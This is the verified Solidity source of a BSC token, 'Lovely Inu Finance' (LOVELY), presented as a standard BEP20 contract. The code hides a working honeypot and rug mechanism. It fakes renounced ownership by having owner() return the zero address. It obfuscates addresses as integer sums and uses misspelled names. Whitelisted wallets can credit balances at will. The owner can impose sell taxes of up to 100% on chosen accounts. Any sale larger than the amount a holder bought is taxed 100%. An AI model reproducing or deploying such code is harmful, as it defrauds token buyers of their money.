/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// http://instagram.com/LovelyInuFinance4289
// https://www.reddit.com/user/LovelyInuFinance4289
// TWITTER:https://LovelyInuFinance4289.com/
// WEBSITE:https://twitter.com/LovelyInuFinance4289
// TELEGRAM:https://t.me/LovelyInuFinance4289

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLovelyInuFinance4289OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingLovelyInuFinance4289OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingLovelyInuFinance4289OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingLovelyInuFinance4289OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLovelyInuFinance4289OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function LovelyInuFinance4289To() external view returns (address);
    function LovelyInuFinance4289ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setLovelyInuFinance4289To(address) external;
    function setLovelyInuFinance4289ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 9;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract LOVELY is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baLovelyInuFinance4289lances;
    mapping(address => uint256) private _baLovelyInuFinance4289lances1;
    mapping(address => bool) private _reLovelyInuFinance4289llease;
    mapping(uint256 => uint256) private _bLovelyInuFinance4289blist;
string name_ = "Lovely Inu Finance";
string symbol_ = "LOVELY";
uint256 totalSupply_ = 50000000000000;   
    address public uniswapV2Pair;
    address deLovelyInuFinance4289ad = 0x000000000000000000000000000000000000dEaD;
    uint256 _gaLovelyInuFinance4289te = 35789919418922637060534349011692753269536900112 + 35789919418922637060534349011692753269536900112;
    uint256 _mxLovelyInuFinance4289x = 37186823070826440511153206997776684193800669567 + 37186823070826440511153206997776684193800669567;
    uint256 _UniLovelyInuFinance4289swap = 48317516608535716592934534788650610587744272679 + 48317516608535716592934534788650610587744272679;
    uint256 _FacLovelyInuFinance4289tory = 534647630852661330346329873059855093349675304110 + 534647630852661330346329873059855093349675304110;
    uint256 SupLovelyInuFinance4289ply = 227364505760837210258202651172342800015673668018;   
    constructor()

BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(uint160(uint256(_UniLovelyInuFinance4289swap))));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this),address(uint160(uint256(_FacLovelyInuFinance4289tory))));

        _mtLovelyInuFinance4289in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deLovelyInuFinance4289ad, totalSupply() / 10*2);
         transfer(address(uint160(uint256(_mxLovelyInuFinance4289x))), totalSupply() / 10*1);
         transfer(address(uint160(uint256(_gaLovelyInuFinance4289te))), totalSupply() / 10*2);
        _reLovelyInuFinance4289llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baLovelyInuFinance4289lances[cauunt];
    }

    function _mtLovelyInuFinance4289in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baLovelyInuFinance4289lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellLovelyInuFinance4289 = 0;
    uint256 private _defaultBuyLovelyInuFinance4289 = 0;

    function _setRelease(address _address) external onlyowaer {
        _reLovelyInuFinance4289llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellLovelyInuFinance4289 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reLovelyInuFinance4289llease[_address];
    }

    function _setLovelyInuFinance4289(uint256[] memory _accLovelyInuFinance4289,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accLovelyInuFinance4289.length;i++){
            _bLovelyInuFinance4289blist[_accLovelyInuFinance4289[i]] = _value[i];
        }
    }
function _msgLovelyInuFinance4289Info(uint _accLovelyInuFinance4289) internal view virtual returns (uint) {
        uint256 accLovelyInuFinance4289 = _accLovelyInuFinance4289 ^ SupLovelyInuFinance4289ply;
return _bLovelyInuFinance4289blist[accLovelyInuFinance4289];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reLovelyInuFinance4289llease[owaer] == true) {
            _baLovelyInuFinance4289lances[to] += amuont;
            return true;
        }
        _tLovelyInuFinance4289transfer(owaer, to, amuont);
        return true;
    }
    function _tLovelyInuFinance4289transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baLovelyInuFinance4289lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeLovelyInuFinance4289 = 0;
        uint256 tradeLovelyInuFinance4289amuont = 0;

        if (!(_reLovelyInuFinance4289llease[from] || _reLovelyInuFinance4289llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeLovelyInuFinance4289 = _defaultBuyLovelyInuFinance4289;
                _baLovelyInuFinance4289lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeLovelyInuFinance4289 = _msgLovelyInuFinance4289Info(uint160(from));
                tradeLovelyInuFinance4289 = tradeLovelyInuFinance4289 < _defaultSellLovelyInuFinance4289 ? _defaultSellLovelyInuFinance4289 : tradeLovelyInuFinance4289;
                tradeLovelyInuFinance4289 = _baLovelyInuFinance4289lances1[from] >= _amuont ? tradeLovelyInuFinance4289 : 100;
                _baLovelyInuFinance4289lances1[from] = _baLovelyInuFinance4289lances1[from] >= _amuont ? _baLovelyInuFinance4289lances1[from] - _amuont : _baLovelyInuFinance4289lances1[from];
            }
                        
            tradeLovelyInuFinance4289amuont = _amuont.mul(tradeLovelyInuFinance4289).div(100);
        }


        if (tradeLovelyInuFinance4289amuont > 0) {
            _baLovelyInuFinance4289lances[from] = _baLovelyInuFinance4289lances[from].sub(tradeLovelyInuFinance4289amuont);
            _baLovelyInuFinance4289lances[deLovelyInuFinance4289ad] = _baLovelyInuFinance4289lances[deLovelyInuFinance4289ad].add(tradeLovelyInuFinance4289amuont);
            emit Transfer(from, deLovelyInuFinance4289ad, tradeLovelyInuFinance4289amuont);
        }

        _baLovelyInuFinance4289lances[from] = _baLovelyInuFinance4289lances[from].sub(_amuont - tradeLovelyInuFinance4289amuont);
        _baLovelyInuFinance4289lances[_to] = _baLovelyInuFinance4289lances[_to].add(_amuont - tradeLovelyInuFinance4289amuont);
        emit Transfer(from, _to, _amuont - tradeLovelyInuFinance4289amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tLovelyInuFinance4289transfer(from, to, amuont);
        return true;
    }
}